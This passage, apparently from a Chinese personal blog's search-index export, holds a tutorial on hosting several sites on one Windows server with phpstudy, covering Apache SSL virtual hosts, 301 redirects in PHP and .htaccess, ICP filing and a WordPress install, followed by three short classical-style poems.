title="一服多站"></a>一服多站</h3><p>之后随着对CTF的了解，萌生了建立一个CTF资源站的想法，然后又想建立一个自己主页（这也算是一个小时候的梦想吧），但是服务器只有一台，IP只有一个，如果都放在同一个目录下用同一个域名的话总觉得别扭，这个要怎么解决呢？又一次和朋友聊天的时候他推荐给我一个软件叫phpstudy，果断放弃xampp使用phpstudy，在phpstudy有一个功能叫做站点域名管理，如下图</p><img src="/2017/03/post005/1488434278819_4925_1488434277635-16274449459533.jpg" class="" title="1488434278819_4925_1488434277635"><img src="/2017/03/post005/1488434289682_3677_1488434288559-16274449498514.jpg" class="" title="1488434289682_3677_1488434288559"><p>于是把需要的域名都通过A记录解析到我的服务器上，再添加到域名管理里边，成功实现了一服多站。<br>随着研究的深入，后来知道：phpstudy是基于apache（也可以选择nginx或iis作为phpstudy的基本程序），通过修改apache的站点配置文件（目录在PHPstudy/Apache/conf/vohsts.conf)也可以实现同样效果，相信聪明的你和我一样一看就懂了，如图：</p><img src="/2017/03/post005/1488436133365_8283_1488436133876.jpg" class="" title="1488436133365_8283_1488436133876"><p>至此，我已经可以较为完善的拥有一个网站服务器了</p><h1 id="建站经验"><a href="#建站经验" class="headerlink" title="建站经验"></a>建站经验</h1><h3 id="备案"><a href="#备案" class="headerlink" title="备案"></a>备案</h3><p>备案对于国内网站来说是必不可少的一个环节，在腾讯云官网首页上就有备案的链接，如图：</p><img src="/2017/03/post005/1488436460607_8841_1488436459506.jpg" class="" title="1488436460607_8841_1488436459506"><p>按照要求一步步备案就好了，这里通常耗时较长，我的第一次备案差不多用了俩月可能还多，备案的过程中域名是不允许有解析的，也就是说，只要你要备案，你的网站必须是关闭的！所以对于有经验的站长来说，一般都是先备案，后建站，不然的话网站运行着好好的突然关了，不知道的人还以为你的网站倒闭了呢！或许有人不信邪，我就不备案咋了？不备案的话刚开始应该是没什么问题的，但使用一段时间之后，国内的服务商就会把你服务器的端口关掉，网站就用不了了，所以记住一句话：要建站，先备案！除非你用的是港服或者外服。</p><h3 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h3><p>在访问例如腾讯云、百度等网站的时候，会在Chrome浏览器的网址栏看到这样一个绿色的小锁<img src="https://blog-10039692.file.myqcloud.com/1488437662385_3300_1488437662130.jpg"> ，感觉特别好，但是访问我自己的网站却只有一个灰色的感叹号<img src="https://blog-10039692.file.myqcloud.com/1488437772942_1273_1488437772290.jpg" alt="http://dz.gl"> ，于是就想，我的网站能不能也有这样一个绿色小锁呢？又是一番各种姿势百度，知道了这个是https协议，需要有网站安全证书，到百度搜了一番，都好贵，舍不得花钱啊~但是峰回路转，发现腾讯云有免费的SSL证书，在管理中心-左上角云产品-SSL证书管理里边，如图：</p><img src="/2017/03/post005/1488438092663_448_1488438101157.jpg" class="" title="1488438092663_448_1488438101157"><p>点击申请证书，按提示操作之后就可以拥有自己的证书了，不过，这个证书只支持2级域名</p><img src="/2017/03/post005/1488438268450_1105_1488438279405.jpg" class="" title="1488438268450_1105_1488438279405"><p>之后在找到对应的证书并且在服务器上安装即可，我用的是Apache，所以把对应SSL证书(有三个文件)上传到服务器某目录下（例如我创建了PHPstudy/SSL文件夹并上传到该目录下)，按照网上的教程修改配置文件，具体方法如下：</p><ol><li> 首先是确认ssl功能是否开启：找到PHPstudy/Apache/conf/httpd.conf这个配置文件中的LoadModule ssl_module modules/mod_ssl.so这句话是否前面有注释符#，如果有的话删掉注释符并保存；<br>在PHPstudy/Apache/conf/httpd.conf中添加这样一句话：Include conf/vhost-ssl.conf 并保存；<br>在PHPstudy/Apache/conf目录下创建vhost-ssl.conf文件，然后编辑（建议使用notepad++编辑，极不推荐记事本）之如下：<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">&lt;VirtualHost *:<span class="hljs-number">443</span>&gt;<br> ServerName www.ctftools.com //这里改为你自己的域名，如果只有一个网站可以把这行删掉<br> DocumentRoot  <span class="hljs-string">&quot;C:\WEB\CTFtools&quot;</span> //这里是你的网站目录<br> SSLEngine on<br> SSLProtocol  all -SSLv2 -SSLv3<br> SSLCipherSuite AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL<br> SSLCertificateFile <span class="hljs-string">&quot;C:\phpStudy\ssl\downssl\1.crt&quot;</span> //证书公钥，大小为<span class="hljs-number">2.01</span>KB左右<br> SSLCertificateKeyFile <span class="hljs-string">&quot;C:\phpStudy\ssl\downssl\3.key&quot;</span> //证书私钥<br> SSLCertificateChainFile <span class="hljs-string">&quot;C:\phpStudy\ssl\downssl\2.crt&quot;</span> //证书链，大小为<span class="hljs-number">1.88</span>KB左右<br>&lt;/VirtualHost&gt;<br>//有几个站点就写几个这样的一段代码<br>&lt;VirtualHost *:<span class="hljs-number">443</span>&gt;<br> ServerName www.dr34m.cn<br> DocumentRoot <span class="hljs-string">&quot;C:\WEB\myhome&quot;</span><br> SSLEngine on<br> SSLProtocol  all -SSLv2 -SSLv3<br> SSLCipherSuite AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL<br> SSLCertificateFile <span class="hljs-string">&quot;C:\phpStudy\ssl\homessl\1.crt&quot;</span><br> SSLCertificateKeyFile <span class="hljs-string">&quot;C:\phpStudy\ssl\homessl\3.key&quot;</span><br> SSLCertificateChainFile <span class="hljs-string">&quot;C:\phpStudy\ssl\homessl\2.crt&quot;</span><br>&lt;/VirtualHost&gt;<br></code></pre></td></tr></table></figure></li><li> 重启phpstudy，然后访问https:// 再加上你的站点，是不是可以访问了？</li></ol><p> <strong>注：</strong>如果遇到重启后无法开启Apache，通常是你的配置文件有问题，要有耐心，慢慢查找配置文件的错误。还有一种可能是你的证书公钥和证书链两个文件反了，颠倒过来即可。</p><h2 id="301重定向"><a href="#301重定向" class="headerlink" title="301重定向"></a>301重定向</h2><p> 刚开始是在访问腾讯云的时候，发现无论输入的是<code>qcloud.com</code>，还是<code>www.qcloud.com</code>，或者是<code>http://www.qcloud.com</code>，最后访问的都是<code>https://www.qcloud.com</code>，这个可就挺好玩的了，刚开始以为是做的跳转，在<code>qcloud.com</code>目录下建立一个自动跳转到<code>www.qcloud.com</code>的网页，后来知道是做的301重定向，做301重定向的好处就是对搜索引擎友好。为什么要做301重定向呢？一方面，301重定向可以使例如<code>qcloud.com</code>跳转到<code>www.qcloud.com</code>，这样能增加<code>www.qcloud.com</code>的权重；另一方面，我们之前做的SSL证书用的是443端口，并且网址前缀是https，用301重定向可以使得例如<code>http://www.qcloud.com</code>跳转到<code>https://www.qcoloud.com</code>，没有这步跳转，那我们的SSL证书就白用了，301重定向的办法很多，我用到了其中两种，具体如下：</p><h3 id="php做重定向"><a href="#php做重定向" class="headerlink" title="php做重定向"></a>php做重定向</h3><p> 这种是用在例如<code>qcloud.com</code>跳转到<code>www.qcloud.com</code>上的，当然，有些网站的权重是放在没有www的网址上，把有www的跳转到没有www的网址上，也是同样的方法</p><ol><li> 在PHPstudy\WWW目录下新建文件index.php（对于这种情况就不需要在站点域名配置中添加<strong>非</strong>权重网址了，但是权重网址还是要有的）；</li><li> 编辑该文件如下<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br> <span class="hljs-variable">$the_host</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>];<br><br> <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$the_host</span>)<br> &#123;<br> <span class="hljs-comment">//下边的就是带www的网址作为权重网址的例子</span><br>     <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;ctftools.com&#x27;</span>: <span class="hljs-comment">//这里改为你的非权重网址</span><br>     &#123;<br>         <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;HTTP/1.1 301 Moved Permanently&#x27;</span>); <span class="hljs-comment">//301是永久重定向的意思</span><br>         <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:https://www.ctftools.com/&#x27;</span>);  <span class="hljs-comment">//这里改为你的权重网址</span><br>     &#125;<br>     <span class="hljs-keyword">break</span>;<br><span class="hljs-comment">//下边的就是不带www的网址作为权重网址的例子</span><br>     <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;www.dz.gl&#x27;</span>:<br>     &#123;<br>         <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;HTTP/1.1 301 Moved Permanently&#x27;</span>);<br>         <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:http://dz.gl&#x27;</span>);<br>     &#125;<br>     <span class="hljs-keyword">break</span>;<br><span class="hljs-comment">//下边则是不符合以上所有情况的例子，学过编程的应该都知道这些语法</span><br>     <span class="hljs-keyword">default</span>:<br>     &#123;<br>         <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;HTTP/1.1 302 Moved Permanently&#x27;</span>); <span class="hljs-comment">//302则是临时重定向的意思</span><br>         <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:http://error.ctftools.com/404.html&#x27;</span>);  <span class="hljs-comment">//这里可以定向到你的404页面</span><br>     &#125;<br> &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="htaccess做重定向"><a href="#htaccess做重定向" class="headerlink" title=".htaccess做重定向"></a>.htaccess做重定向</h3><p> 上边的php方法对于权重网站重定向来说无疑是一种简单的方法，但是对于http向https跳转则没办法了，这就需要.htaccess做重定向（这种方法同样适用于权重网站跳转），方法如下：</p><p>1.首先打开<code>PHPstudy/Apache/conf/httpd.conf</code>并检查<code>LoadModule rewrite_module modules/mod_rewrite.so</code>这句话前面有没有注释符#，有则删掉;<br>在<strong>网站目录</strong>下创建.htaccess文件，这种以点开头的文件在windows下不好创建，通常使用dos命令来创建，或者用notepad++，新建一个文件，在保存的时候类型选择所有文件，文件名改为.htaccess，如图：<img src="/2017/03/post005/1488441538912_436_1488441538316.jpg" class="" title="1488441538912_436_1488441538316"><br>编辑该文件如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="hljs-attribute">RewriteEngine</span> <span class="hljs-literal">on</span><br><span class="hljs-attribute">RewriteCond</span> <span class="hljs-variable">%&#123;SERVER_PORT&#125;</span> !^<span class="hljs-number">443</span>$<br><span class="hljs-attribute">RewriteRule</span> ^(.*)$ https://www.ctftools.com/$<span class="hljs-number">1</span><span class="hljs-meta"> [L,R=301]  //改为你的站点</span><br><span class="hljs-meta">&lt;/IfModule&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>这时候直接访问http:// 加上你的站点，是不是直接就能跳转到https:// 加上你的站点了？</li></ol><h1 id="在服务器上安装wordpress"><a href="#在服务器上安装wordpress" class="headerlink" title="在服务器上安装wordpress"></a>在服务器上安装wordpress</h1><p><strong>wordpress是一个著名的博客系统，安装主要用到了mysql(phpstudy集成了)，具体安装方法如下：</strong></p><h3 id="配置MySQL"><a href="#配置MySQL" class="headerlink" title="配置MySQL"></a>配置MySQL</h3><ol><li> 首先修改mysql的密码(针对忘了密码或者不知道密码的童鞋)，如图修改即可；<img src="/2017/03/post005/1488443780553_6823_1488443779593.jpg" class="" title="1488443780553_6823_1488443779593"></li><li> 接着访问：<a href="http://你的ip/phpmyadmin">http://你的IP/phpmyadmin</a> 或者点击phpstudy上边的MySQL管理器—MySQL-front（如图）<img src="/2017/03/post005/1488443755039_5831_1488443754438.jpg" class="" title="1488443755039_5831_1488443754438"></li><li> 新建一个数据库：如图，以在服务器端MySQL-front中操作为例：<br>右击左侧localhost—新建—数据库<img src="/2017/03/post005/1488444028336_2727_1488444027827.jpg" class="" title="1488444028336_2727_1488444027827"><img src="/2017/03/post005/1488444073489_993_1488444072473.jpg" class="" title="1488444073489_993_1488444072473"></li></ol><h3 id="安装wordpress"><a href="#安装wordpress" class="headerlink" title="安装wordpress"></a>安装wordpress</h3><ol><li> 到<a href="https://cn.wordpress.org/">wordpress官网</a>下载wordpress并上传到你的服务器某目录下；</li><li> 访问”你的目录所绑定域名/wp-admin/install.php”，会出现如图：<img src="/2017/03/post005/1488444539486_5449_1488444539273.jpg" class="" title="1488444539486_5449_1488444539273"></li><li> 按图操作：<img src="/2017/03/post005/1488444576677_3585_1488444575741.jpg" class="" title="1488444576677_3585_1488444575741"></li><li> 如果数据库信息没有问题就会出现<img src="/2017/03/post005/1488444591766_7065_1488444590814.jpg" class="" title="1488444591766_7065_1488444590814"></li><li> 接着按提示输入你的站点信息：<img src="/2017/03/post005/1488444713598_3604_1488444713356.jpg" class="" title="1488444713598_3604_1488444713356"></li><li> 这样就可以拥有自己的博客或者论坛了<br>关于windows建站经验就写到这里，以后我或许会改用linux，届时还会和大家分享，感谢阅读</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>Nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>危山</title>
    <link href="/2015/09/post239/"/>
    <url>/2015/09/post239/</url>
    
    <content type="html"><![CDATA[<p>寂夜望危山，危山望不穿。<br>孰怜危山前，孤鸿几盘旋。<br>其目泪盈盈，其声戚惨惨。<br>其心无人会，其念隔危山。</p>]]></content>
    
    
    
    <tags>
      
      <tag>随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>水调歌头</title>
    <link href="/2015/09/post240/"/>
    <url>/2015/09/post240/</url>
    
    <content type="html"><![CDATA[<p>误被前缘误，痛被昔情痛。拟比名花，远胜月季牡丹红。残月窥人檐下，余晖隐洒案前，杯酒话心声。落花时节逢，安可赏孤鸿。<br>烛偷瘦，夜渐深，梦不成。奇葩艳卉，深红浅白何足争。长夜思君难彻，光阴暗转乾坤，耳畔荡清风。当使伊人在，冯虚幽境中。</p>]]></content>
    
    
    
    <tags>
      
      <tag>随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>水调歌头</title>
    <link href="/2015/09/post241/"/>
    <url>/2015/09/post241/</url>
    
    <content type="html"><![CDATA[<p>暮雨何时尽，举酒问青天。不知今夕此刻，孰与我同酣。也欲觅君而去，又恐路途险远，跌落在云端。辗转复反侧，伊人闹心间。<br>风凄凄，夜惨惨，君在安。不应长叹，何日与子共开颜。人云情深不寿，又曰慧极必伤，此事古难全。若使君心欢，吾宁肝肠断。</p>]]></content>
    
    
    
    <tags>
      
      <tag>随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
